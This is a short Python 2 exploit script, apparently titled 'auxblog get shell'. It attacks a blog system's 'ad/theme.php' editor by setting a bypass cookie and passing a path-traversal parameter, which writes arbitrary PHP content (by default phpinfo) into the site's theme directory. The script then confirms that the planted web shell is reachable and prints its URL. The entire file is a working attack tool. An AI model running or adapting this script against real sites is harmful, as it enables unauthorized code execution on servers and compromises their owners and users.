#! /usr/bin/python
# -*- coding:utf-8 -*- 
#author:xq17
#title:auxblog get shell
#version 1.0.6
import sys,getopt
import requests
import random
def main(argv):
        host="";
        content="<?php phpinfo(); ?>";
        try:
                opts, args = getopt.getopt(argv,"ht:c:")
        except getopt.GetoptError:
                print "-h check help"
                print "example: shell.py -t [url]http://baidu.com[/url] -c <?php phpinfo();?>(#extract)"
                sys.exit(2)
        for opt,arg in opts:
                if opt == "-h ":
                        print "example: shell.py -t [url]http://baidu.com[/url] -c <?php phpinfo();?>(#extract)"
                elif opt == "-t":
                        host = arg
                elif opt == "-c":
                        content=arg
        result = getshell(host,content)
        if result == 0:
                print '404!!!failed or bug is fixed'
        else:
                print 'yes'
def getshell(host,content):
        headers = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0'}
        r = requests.get(host,headers=headers)
        if r.status_code != 200:
                return 0
        #判断漏洞文件是否存在
        payload_file = 'ad/theme.php'
        url = host+payload_file
        r1 = requests.get(host,headers=headers)
        if r.status_code != 200:
                return 0
        #写入shell
        rand_n = str(random.randint(999,9999))
        payload_url = url+'?g=edit2save&path=../theme/test_'+rand_n+'.php'+'&content={}'.format(content)
        cookies={'chkad':'1'}
        r2 = requests.get(payload_url,headers=headers,cookies=cookies)
        shell_path = host+'theme/test_'+rand_n+'.php'
        if '保存文件成功' in r2.content:
                r3 = requests.get(shell_path)
                if r3.status_code == 200:
                        print 'OK!!!GET SHELL SUCESSFULLY'
                        print shell_path
                        return 1
                else:
                        print 'bug is fixed'
        return 0
if __name__ == '__main__':
        if len(sys.argv) < 2:
                print "example: shell.py -t [url]http://baidu.com[/url] -c <?php phpinfo();?>(#extract)"
                sys.exit()
        main(sys.argv[1:])